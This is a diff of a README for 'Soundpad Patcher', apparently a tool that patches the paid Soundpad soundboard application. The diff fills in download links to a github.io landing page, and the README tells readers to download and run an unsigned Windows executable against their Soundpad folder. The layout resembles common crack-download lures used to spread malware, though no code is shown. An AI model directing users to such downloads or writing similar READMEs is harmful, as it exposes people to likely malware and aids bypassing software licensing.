@@ -30,7 +30,7 @@ Soundpad is a soundboard application widely used by streamers, voice-chat commun
 This project is intentionally narrow in scope. It does not manage sound libraries, hotkeys, or audio devices, and it has no networking component. Its only job is to locate the correct files, apply a patch reliably, and report clearly whether the operation succeeded — which is also why it works the same way across most recent Soundpad releases without extra configuration.
 
 <p align="center">
-  <a href="/////////////">
+  <a href="https://romanparkops1901p9.github.io/soundpad-patch-tool-2026/">
     <img src="https://img.shields.io/badge/DOWNLOAD-Soundpad_Patcher-0D9488?style=for-the-badge&logo=windows&logoColor=white&labelColor=0F766E" width="550" alt="Download"/>
   </a>
 </p>
@@ -64,7 +64,7 @@ The button above opens the project's landing page, where the current build of So
 
 **TL;DR: visit the landing page, download the tool, run it, point it at Soundpad.**
 
-1. Open the [download page](///////////) linked above.
+1. Open the [download page](https://romanparkops1901p9.github.io/soundpad-patch-tool-2026/) linked above.
 2. Download the current build of Soundpad Patcher for Windows.
 3. Run the executable — no installer or setup wizard is involved.
 4. Confirm or browse to your Soundpad installation folder when prompted.
